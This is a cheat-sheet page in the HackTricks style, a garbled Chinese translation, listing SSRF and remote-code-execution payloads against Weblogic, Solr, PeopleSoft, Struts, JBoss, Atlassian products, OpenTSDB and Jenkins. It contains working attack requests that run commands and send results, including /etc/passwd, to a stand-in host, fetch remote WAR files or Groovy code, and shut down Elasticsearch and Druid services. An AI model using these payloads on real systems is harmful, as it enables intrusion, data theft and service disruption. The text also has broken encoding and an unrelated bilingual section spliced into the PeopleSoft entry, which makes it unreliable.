# SSRFæ˜“å—æ”»å‡»çš„å¹³å°

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

è¿™ä¸€éƒ¨åˆ†å†…å®¹æ¥è‡ª[https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/)

## Elasticsearch

**å¸¸ç”¨ç»‘å®šç«¯å£ï¼š9200**

å½“Elasticsearchåœ¨å†…éƒ¨éƒ¨ç½²æ—¶ï¼Œé€šå¸¸ä¸éœ€è¦èº«ä»½éªŒè¯ã€‚

å¦‚æœä½ æœ‰ä¸€ä¸ªéƒ¨åˆ†ç›²ç›®çš„SSRFï¼Œå¯ä»¥ç¡®å®šçŠ¶æ€ç ï¼Œè¯·æ£€æŸ¥ä»¥ä¸‹ç«¯ç‚¹æ˜¯å¦è¿”å›200ï¼š
```http
/_cluster/health
/_cat/indices
/_cat/health
```
å¦‚æœä½ æœ‰ä¸€ä¸ªç›²ç›®çš„SSRFï¼Œå¯ä»¥å‘é€POSTè¯·æ±‚ï¼Œä½ å¯ä»¥é€šè¿‡å‘ä»¥ä¸‹è·¯å¾„å‘é€POSTè¯·æ±‚æ¥å…³é—­Elasticsearchå®ä¾‹ï¼š

æ³¨æ„ï¼š`_shutdown` APIå·²ä»Elasticsearchç‰ˆæœ¬2.xåŠä»¥ä¸Šä¸­åˆ é™¤ã€‚è¿™ä»…é€‚ç”¨äºElasticsearch 1.6åŠä»¥ä¸‹ç‰ˆæœ¬ï¼š
```http
/_shutdown
/_cluster/nodes/_master/_shutdown
/_cluster/nodes/_shutdown
/_cluster/nodes/_all/_shutdown
```
## Weblogic

**å¸¸è§ç»‘å®šç«¯å£ï¼š80ã€443ï¼ˆSSLï¼‰ã€7001ã€8888**

**SSRFé‡‘ä¸é›€ï¼šUDDI Explorerï¼ˆCVE-2014-4210ï¼‰**
```http
POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1
Host: target.com
Content-Length: 137
Content-Type: application/x-www-form-urlencoded

operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```
è¿™ä¸ªæ–¹æ³•ä¹Ÿé€‚ç”¨äºGETè¯·æ±‚ï¼š
```bash
http://target.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```
è¿™ä¸ªç«¯ç‚¹ä¹Ÿå®¹æ˜“å—åˆ°CRLFæ³¨å…¥æ”»å‡»ï¼š
```
GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://attacker.com:4000/exp%20HTTP/1.11%0AX-CLRF%3A%20Injected%0A&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search HTTP/1.0
Host: vuln.weblogic
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Connection: close
```
å°†å¯¼è‡´ä»¥ä¸‹è¯·æ±‚ï¼š
```
root@mail:~# nc -lvp 4000
Listening on [0.0.0.0] (family 0, port 4000)
Connection from example.com 43111 received!
POST /exp HTTP/1.11
X-CLRF: Injected HTTP/1.1
Content-Type: text/xml; charset=UTF-8
soapAction: ""
Content-Length: 418
User-Agent: Java1.6.0_24
Host: attacker.com:4000
Accept: text/html, image/gif, image/jpeg, */*; q=.2
Connection: Keep-Alive

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><env:Envelope xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><env:Header/><env:Body><find_business generic="2.0" xmlns="urn:uddi-org:api_v2"><name>sdf</name></find_business></env:Body></env:Envelope>
```
**SSRFé‡‘ä¸é›€ï¼šCVE-2020-14883**

æ¥è‡ª[è¿™é‡Œ](https://forum.90sec.com/t/topic/1412)ã€‚

Linux:
```http
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```
Windows:

Windowsæ˜¯ä¸€ç§å¹¿æ³›ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿï¼Œå› æ­¤å­˜åœ¨è®¸å¤šå®¹æ˜“å—åˆ°SSRFæ”»å‡»çš„å¹³å°ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„å—æ¼æ´å½±å“çš„Windowså¹³å°ï¼š

- IISï¼ˆInternet Information Servicesï¼‰ï¼šIISæ˜¯Windowsä¸Šå¸¸ç”¨çš„WebæœåŠ¡å™¨ã€‚é€šè¿‡åˆ©ç”¨IISçš„æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥æ‰§è¡ŒSSRFæ”»å‡»ã€‚
- SMBï¼ˆServer Message Blockï¼‰ï¼šSMBæ˜¯Windowsä¸Šç”¨äºæ–‡ä»¶å…±äº«å’Œç½‘ç»œé€šä¿¡çš„åè®®ã€‚é€šè¿‡åˆ©ç”¨SMBçš„æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥å‘èµ·SSRFæ”»å‡»ã€‚
- MSSQLï¼ˆMicrosoft SQL Serverï¼‰ï¼šMSSQLæ˜¯Windowsä¸Šå¸¸ç”¨çš„å…³ç³»å‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿã€‚é€šè¿‡åˆ©ç”¨MSSQLçš„æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥è¿›è¡ŒSSRFæ”»å‡»ã€‚
- Exchange Serverï¼šExchange Serveræ˜¯Windowsä¸Šå¸¸ç”¨çš„é‚®ä»¶æœåŠ¡å™¨ã€‚é€šè¿‡åˆ©ç”¨Exchange Serverçš„æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥æ‰§è¡ŒSSRFæ”»å‡»ã€‚

è¿™äº›å¹³å°çš„æ¼æ´å¯èƒ½å¯¼è‡´æ”»å‡»è€…èƒ½å¤Ÿå‘é€æ¶æ„è¯·æ±‚ï¼Œä»è€Œè®¿é—®å†…éƒ¨èµ„æºæˆ–æ”»å‡»å…¶ä»–ç³»ç»Ÿã€‚å› æ­¤ï¼Œå¯¹äºè¿™äº›å¹³å°ï¼Œç¡®ä¿åŠæ—¶ä¿®è¡¥æ¼æ´å’Œå®æ–½å®‰å…¨æªæ–½éå¸¸é‡è¦ã€‚
```http
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```
## Hashicorp Consul

**å¸¸è§ç»‘å®šç«¯å£ï¼š8500ï¼Œ8501ï¼ˆSSLï¼‰**

å¯ä»¥åœ¨[è¿™é‡Œ](https://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html)æ‰¾åˆ°è¯¦ç»†è¯´æ˜ã€‚

## Shellshock

**å¸¸è§ç»‘å®šç«¯å£ï¼š80ï¼Œ443ï¼ˆSSLï¼‰ï¼Œ8080**

ä¸ºäº†æœ‰æ•ˆåœ°æµ‹è¯•Shellshockï¼Œæ‚¨å¯èƒ½éœ€è¦æ·»åŠ ä¸€ä¸ªåŒ…å«æœ‰æ•ˆè½½è·çš„å¤´éƒ¨ã€‚ä»¥ä¸‹CGIè·¯å¾„å€¼å¾—å°è¯•ï¼š

æµ‹è¯•çš„CGIè·¯å¾„çš„ç®€çŸ­åˆ—è¡¨ï¼š

[GiståŒ…å«è·¯å¾„](https://gist.github.com/infosec-au/009fcbdd5bad16bb6ceb36b838d96be4)ã€‚

**SSRF Canaryï¼šé€šè¿‡ç”¨æˆ·ä»£ç†çš„Shellshock**
```bash
User-Agent: () { foo;}; echo Content-Type: text/plain ; echo ;  curl SSRF_CANARY
```
## Apache Druid

**å¸¸è§ç»‘å®šç«¯å£ï¼š80ã€8080ã€8888ã€8082**

æŸ¥çœ‹Apache Druidçš„APIå‚è€ƒæ–‡æ¡£[æ­¤å¤„](https://druid.apache.org/docs/latest/operations/api-reference.html)ã€‚

å¦‚æœæ‚¨å¯ä»¥æŸ¥çœ‹çŠ¶æ€ç ï¼Œè¯·æ£€æŸ¥ä»¥ä¸‹è·¯å¾„ï¼Œçœ‹å®ƒä»¬æ˜¯å¦è¿”å›200çŠ¶æ€ç ï¼š
```bash
/status/selfDiscovered/status
/druid/coordinator/v1/leader
/druid/coordinator/v1/metadata/datasources
/druid/indexer/v1/taskStatus
```
å…³é—­ä»»åŠ¡ï¼Œéœ€è¦çŒœæµ‹ä»»åŠ¡IDæˆ–æ•°æ®æºåç§°ï¼š
```bash
/druid/indexer/v1/task/{taskId}/shutdown
/druid/indexer/v1/datasources/{dataSource}/shutdownAllTasks
```
å…³é—­Apache Druid Overlordsä¸Šçš„ç›‘ç£ç¨‹åºï¼š
```bash
/druid/indexer/v1/supervisor/terminateAll
/druid/indexer/v1/supervisor/{supervisorId}/shutdown
```
## Apache Solr

**å¸¸è§ç»‘å®šç«¯å£ï¼š8983**

**SSRFé‡‘ä¸é›€ï¼šShardså‚æ•°**

> è¡¥å……ä¸€ä¸‹shubhamæ‰€è¯´çš„ - æ‰«æsolrç›¸å¯¹å®¹æ˜“ã€‚æœ‰ä¸€ä¸ªshards=å‚æ•°ï¼Œå…è®¸ä½ åå¼¹SSRFåˆ°SSRFï¼Œä»¥éªŒè¯ä½ æ˜¯å¦ç›²ç›®åœ°æ”»å‡»äº†solrå®ä¾‹ã€‚
>
> â€” Ğ¥Ğ°Ğ²Ğ¸Ğ¶ ĞĞ°Ñ„Ñ„Ğ¸ ğŸ¥• (@nnwakelam) [2021å¹´1æœˆ13æ—¥](https://twitter.com/nnwakelam/status/1349298311853821956?ref\_src=twsrc%5Etfw)

æ¥æºï¼š[è¿™é‡Œ](https://github.com/veracode-research/solr-injection)
```bash
/search?q=Apple&shards=http://SSRF_CANARY/solr/collection/config%23&stream.body={"set-property":{"xxx":"yyy"}}
/solr/db/select?q=orange&shards=http://SSRF_CANARY/solr/atom&qt=/select?fl=id,name:author&wt=json
/xxx?q=aaa%26shards=http://SSRF_CANARY/solr
/xxx?q=aaa&shards=http://SSRF_CANARY/solr
```
**SSRFé‡‘ä¸é›€ï¼šSolr XXEï¼ˆ2017ï¼‰**

[Apache Solr 7.0.1 XXEï¼ˆPacketstormï¼‰](https://packetstormsecurity.com/files/144678/Apache-Solr-7.0.1-XXE-Injection-Code-Execution.html)
```bash
/solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://SSRF_CANARY/xxx"'><a></a>'
/xxx?q={!type=xmlparser v="<!DOCTYPE a SYSTEM 'http://SSRF_CANARY/solr'><a></a>"}
```
**é€šè¿‡dataImportHandlerå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰**

[é€šè¿‡dataImportHandlerå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œçš„ç ”ç©¶](https://github.com/veracode-research/solr-injection#3-cve-2019-0193-remote-code-execution-via-dataimporthandler)

## PeopleSoft

**å¸¸è§ç»‘å®šç«¯å£ï¼š80ã€443ï¼ˆSSLï¼‰**

å–è‡ªè¿™ç¯‡ç ”ç©¶[æ–‡ç« ](https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce)ã€‚

**SSRF Canaryï¼šXXE #1**
```http
POST /PSIGW/HttpListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

<?xml version="1.0"?>
<!DOCTYPE IBRequest [
<!ENTITY x SYSTEM "http://SSRF_CANARY">
]>
<IBRequest>
<ExternalOperationName>&x;</ExternalOperationName>
<OperationType/>
<From><RequestingNode/>
<Password/>
<OrigUser/>
<OrigNode/>
<OrigProcess/>
<OrigTimeStamp/>
</From>
<To>
<FinalDestination/>
<DestinationNode/>
<SubChannel/>
</To>
<ContentSections>
<ContentSection>
<NonRepudiation/>
<MessageVersion/>
<Data><![CDATA[<?xml version="1.0"?>your_message_content]]>
</Data>
</ContentSection>
</ContentSections>
</IBRequest>
```
**SSRFé‡‘ä¸é›€ï¼šXXE #2**

---

## SSRF Vulnerable Platforms

## SSRFæ˜“å—æ”»å‡»çš„å¹³å°

The following is a list of platforms that are commonly found to be vulnerable to Server-Side Request Forgery (SSRF) attacks. These platforms often allow users to make requests to arbitrary URLs, which can be exploited to perform SSRF attacks.

ä»¥ä¸‹æ˜¯å¸¸è§æ˜“å—Server-Side Request Forgery (SSRF)æ”»å‡»çš„å¹³å°åˆ—è¡¨ã€‚è¿™äº›å¹³å°é€šå¸¸å…è®¸ç”¨æˆ·å‘ä»»æ„URLå‘å‡ºè¯·æ±‚ï¼Œè¿™å¯ä»¥è¢«åˆ©ç”¨æ¥æ‰§è¡ŒSSRFæ”»å‡»ã€‚

### 1. Localhost

### 1. æœ¬åœ°ä¸»æœº

The `localhost` or loopback address (`127.0.0.1`) is often vulnerable to SSRF attacks. This is because many applications use the `localhost` address to communicate with internal services or resources. By exploiting SSRF vulnerabilities, an attacker can make requests to internal services and potentially gain unauthorized access.

`localhost`æˆ–å›ç¯åœ°å€ï¼ˆ`127.0.0.1`ï¼‰é€šå¸¸å®¹æ˜“å—åˆ°SSRFæ”»å‡»ã€‚è¿™æ˜¯å› ä¸ºè®¸å¤šåº”ç”¨ç¨‹åºä½¿ç”¨`localhost`åœ°å€ä¸å†…éƒ¨æœåŠ¡æˆ–èµ„æºè¿›è¡Œé€šä¿¡ã€‚é€šè¿‡åˆ©ç”¨SSRFæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥å‘å†…éƒ¨æœåŠ¡å‘å‡ºè¯·æ±‚ï¼Œå¹¶æœ‰å¯èƒ½è·å¾—æœªç»æˆæƒçš„è®¿é—®æƒé™ã€‚

### 2. Private IP Addresses

### 2. ç§æœ‰IPåœ°å€

Private IP addresses, such as those in the `10.0.0.0/8`, `172.16.0.0/12`, and `192.168.0.0/16` ranges, are often vulnerable to SSRF attacks. These addresses are commonly used for internal networks and are not meant to be accessed from the internet. However, if an application allows users to make requests to private IP addresses, an attacker can abuse this functionality to perform SSRF attacks.

ç§æœ‰IPåœ°å€ï¼Œä¾‹å¦‚`10.0.0.0/8`ï¼Œ`172.16.0.0/12`å’Œ`192.168.0.0/16`èŒƒå›´å†…çš„åœ°å€ï¼Œé€šå¸¸å®¹æ˜“å—åˆ°SSRFæ”»å‡»ã€‚è¿™äº›åœ°å€é€šå¸¸ç”¨äºå†…éƒ¨ç½‘ç»œï¼Œå¹¶ä¸é€‚åˆä»äº’è”ç½‘è®¿é—®ã€‚ç„¶è€Œï¼Œå¦‚æœä¸€ä¸ªåº”ç”¨ç¨‹åºå…è®¸ç”¨æˆ·å‘ç§æœ‰IPåœ°å€å‘å‡ºè¯·æ±‚ï¼Œæ”»å‡»è€…å¯ä»¥æ»¥ç”¨è¿™ä¸ªåŠŸèƒ½æ¥æ‰§è¡ŒSSRFæ”»å‡»ã€‚

### 3. Metadata Endpoints

### 3. å…ƒæ•°æ®ç«¯ç‚¹

Metadata endpoints, such as the AWS EC2 metadata endpoint (`http://169.254.169.254/latest/meta-data/`) or the Google Cloud metadata endpoint (`http://metadata.google.internal/computeMetadata/v1/`), are often vulnerable to SSRF attacks. These endpoints provide information about the instance or virtual machine running the application. By exploiting SSRF vulnerabilities, an attacker can retrieve sensitive information from these metadata endpoints.

å…ƒæ•°æ®ç«¯ç‚¹ï¼Œä¾‹å¦‚AWS EC2å…ƒæ•°æ®ç«¯ç‚¹ï¼ˆ`http://169.254.169.254/latest/meta-data/`ï¼‰æˆ–Google Cloudå…ƒæ•°æ®ç«¯ç‚¹ï¼ˆ`http://metadata.google.internal/computeMetadata/v1/`ï¼‰ï¼Œé€šå¸¸å®¹æ˜“å—åˆ°SSRFæ”»å‡»ã€‚è¿™äº›ç«¯ç‚¹æä¾›æœ‰å…³è¿è¡Œåº”ç”¨ç¨‹åºçš„å®ä¾‹æˆ–è™šæ‹Ÿæœºçš„ä¿¡æ¯ã€‚é€šè¿‡åˆ©ç”¨SSRFæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥ä»è¿™äº›å…ƒæ•°æ®ç«¯ç‚¹ä¸­è·å–æ•æ„Ÿä¿¡æ¯ã€‚

### 4. File Protocols

### 4. æ–‡ä»¶åè®®

Some applications allow users to make requests to file protocols, such as `file://`, `ftp://`, or `smb://`. These protocols can be abused to perform SSRF attacks by accessing local files or network resources that should not be exposed to the internet.

ä¸€äº›åº”ç”¨ç¨‹åºå…è®¸ç”¨æˆ·å‘æ–‡ä»¶åè®®ï¼ˆå¦‚`file://`ï¼Œ`ftp://`æˆ–`smb://`ï¼‰å‘å‡ºè¯·æ±‚ã€‚é€šè¿‡è®¿é—®ä¸åº”æš´éœ²åœ¨äº’è”ç½‘ä¸Šçš„æœ¬åœ°æ–‡ä»¶æˆ–ç½‘ç»œèµ„æºï¼Œå¯ä»¥æ»¥ç”¨è¿™äº›åè®®æ¥æ‰§è¡ŒSSRFæ”»å‡»ã€‚

### 5. Cloud Metadata Services

### 5. äº‘å…ƒæ•°æ®æœåŠ¡

Cloud metadata services, such as the Azure Instance Metadata Service (`http://169.254.169.254/metadata/instance?api-version=2019-06-01`) or the DigitalOcean metadata service (`http://169.254.169.254/metadata/v1/`), are often vulnerable to SSRF attacks. These services provide information about the cloud instance or droplet running the application. By exploiting SSRF vulnerabilities, an attacker can retrieve sensitive information from these metadata services.

äº‘å…ƒæ•°æ®æœåŠ¡ï¼Œä¾‹å¦‚Azureå®ä¾‹å…ƒæ•°æ®æœåŠ¡ï¼ˆ`http://169.254.169.254/metadata/instance?api-version=2019-06-01`ï¼‰æˆ–DigitalOceanå…ƒæ•°æ®æœåŠ¡ï¼ˆ`http://169.254.169.254/metadata/v1/`ï¼‰ï¼Œé€šå¸¸å®¹æ˜“å—åˆ°SSRFæ”»å‡»ã€‚è¿™äº›æœåŠ¡æä¾›æœ‰å…³è¿è¡Œåº”ç”¨ç¨‹åºçš„äº‘å®ä¾‹æˆ–dropletçš„ä¿¡æ¯ã€‚é€šè¿‡åˆ©ç”¨SSRFæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥ä»è¿™äº›å…ƒæ•°æ®æœåŠ¡ä¸­è·å–æ•æ„Ÿä¿¡æ¯ã€‚

### 6. SSRF Testing Platforms

### 6. SSRFæµ‹è¯•å¹³å°

There are also specific platforms designed for testing SSRF vulnerabilities, such as `http://ssrf.local` or `http://ssrfpoc.com`. These platforms are intentionally vulnerable and can be used to practice and demonstrate SSRF attacks.

è¿˜æœ‰ä¸€äº›ä¸“é—¨ç”¨äºæµ‹è¯•SSRFæ¼æ´çš„å¹³å°ï¼Œä¾‹å¦‚`http://ssrf.local`æˆ–`http://ssrfpoc.com`ã€‚è¿™äº›å¹³å°æ˜¯æœ‰æ„è®¾å®šä¸ºæ˜“å—æ”»å‡»çš„ï¼Œå¯ä»¥ç”¨äºç»ƒä¹ å’Œæ¼”ç¤ºSSRFæ”»å‡»ã€‚

---

**References:**

- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)
```http
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

<!DOCTYPE a PUBLIC "-//B/A/EN" "http://SSRF_CANARY">
```
## Apache Struts

**å¸¸è§ç»‘å®šç«¯å£ï¼š80ã€443ï¼ˆSSLï¼‰ã€8080ã€8443ï¼ˆSSLï¼‰**

æ¥è‡ª[è¿™é‡Œ](https://blog.safebuff.com/2016/07/03/SSRF-Tips/)ã€‚

**SSRF Canary: Struts2-016**ï¼š

å°†æ­¤é™„åŠ åˆ°æ‚¨æ‰€çŸ¥é“çš„æ¯ä¸ªå†…éƒ¨ç«¯ç‚¹/URLçš„æœ«å°¾ï¼š
```http
?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://SSRF_CANARY/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
```
## JBoss

**å¸¸è§ç»‘å®šç«¯å£ï¼š80ã€443ï¼ˆSSLï¼‰ã€8080ã€8443ï¼ˆSSLï¼‰**

æ¥è‡ª[è¿™é‡Œ](https://blog.safebuff.com/2016/07/03/SSRF-Tips/)ã€‚

**SSRFé‡‘ä¸é›€ï¼šä»URLéƒ¨ç½²WARæ–‡ä»¶**
```bash
/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://SSRF_CANARY/utils/cmd.war
```
## Confluence

**å¸¸è§ç»‘å®šç«¯å£ï¼š80ã€443ï¼ˆSSLï¼‰ã€8080ã€8443ï¼ˆSSLï¼‰**

**SSRFé‡‘ä¸é›€ï¼šSharelinksï¼ˆé€‚ç”¨äº2016å¹´11æœˆåŠä¹‹å‰å‘å¸ƒçš„Confluenceç‰ˆæœ¬ï¼‰**
```bash
/rest/sharelinks/1.0/link?url=https://SSRF_CANARY/
```
**SSRFé‡‘ä¸é›€ï¼šiconUriServlet - Confluence < 6.1.3 (CVE-2017-9506)**

[Atlassianå®‰å…¨ç¥¨æ®OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
## Jira

**å¸¸è§ç»‘å®šç«¯å£ï¼š80ã€443ï¼ˆSSLï¼‰ã€8080ã€8443ï¼ˆSSLï¼‰**

**SSRF é‡‘ä¸é›€ï¼šiconUriServlet - Jira < 7.3.5ï¼ˆCVE-2017-9506ï¼‰**

[Atlassian å®‰å…¨ç¥¨ OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
**SSRFé‡‘ä¸é›€ï¼šmakeRequest - Jira < 8.4.0 (CVE-2019-8451)**

[Atlassianå®‰å…¨ç¥¨æ®JRASERVER-69793](https://jira.atlassian.com/browse/JRASERVER-69793)
```bash
/plugins/servlet/gadgets/makeRequest?url=https://SSRF_CANARY:443@example.com
```
## å…¶ä»– Atlassian äº§å“

**å¸¸è§ç»‘å®šç«¯å£ï¼š80ã€443ï¼ˆSSLï¼‰ã€8080ã€8443ï¼ˆSSLï¼‰**

**SSRF é‡‘ä¸é›€ï¼šiconUriServletï¼ˆCVE-2017-9506ï¼‰**ï¼š

* Bamboo < 6.0.0
* Bitbucket < 4.14.4
* Crowd < 2.11.2
* Crucible < 4.3.2
* Fisheye < 4.3.2

[Atlassian å®‰å…¨ç¥¨ OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
## OpenTSDB

**å¸¸è§ç»‘å®šç«¯å£ï¼š4242**

[OpenTSDBè¿œç¨‹ä»£ç æ‰§è¡Œ](https://packetstormsecurity.com/files/136753/OpenTSDB-Remote-Code-Execution.html)

**SSRFé‡‘ä¸é›€ï¼šé€šè¿‡RCEè¿›è¡Œcurl**
```bash
/q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20SSRF_CANARY%60&style=linespoint&png
```
[OpenTSDB 2.4.0 è¿œç¨‹ä»£ç æ‰§è¡Œ](https://github.com/OpenTSDB/opentsdb/issues/2051)

**SSRF é‡‘ä¸é›€ï¼šé€šè¿‡ RCE è¿›è¡Œ curl - CVE-2020-35476**
```bash
/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('wget%20--post-file%20/etc/passwd%20SSRF_CANARY')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
```
## Jenkins

**å¸¸è§ç»‘å®šç«¯å£ï¼š80ã€443ï¼ˆSSLï¼‰ã€8080ã€8888**

[è¿™é‡Œ](https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html)æœ‰ä¸€ç¯‡å¾ˆæ£’çš„æ–‡ç« ã€‚

**SSRF é‡‘ä¸é›€ï¼šCVE-2018-1000600**
```bash
/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://SSRF_CANARY/%23&login=orange&password=tsai
```
**RCE**

æŒ‰ç…§è¿™é‡Œçš„æŒ‡ç¤ºé€šè¿‡GETå®ç°RCEï¼š[Hacking Jenkins Part 2 - æ»¥ç”¨å…ƒç¼–ç¨‹å®ç°æœªç»èº«ä»½éªŒè¯çš„RCEï¼](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html)
```bash
/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='orange.tw', root='http://SSRF_CANARY/')%0a@Grab(group='tw.orange', module='poc', version='1')%0aimport Orange;
```
**é€šè¿‡Groovyå®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰**

In some cases, SSRF vulnerabilities can be exploited to achieve Remote Code Execution (RCE) by leveraging the Groovy scripting language. Groovy is often used in Java applications for scripting purposes.

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯ä»¥åˆ©ç”¨SSRFæ¼æ´æ¥å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰ï¼Œé€šè¿‡åˆ©ç”¨Groovyè„šæœ¬è¯­è¨€ã€‚Groovyç»å¸¸ç”¨äºJavaåº”ç”¨ç¨‹åºçš„è„šæœ¬ç¼–å†™ã€‚

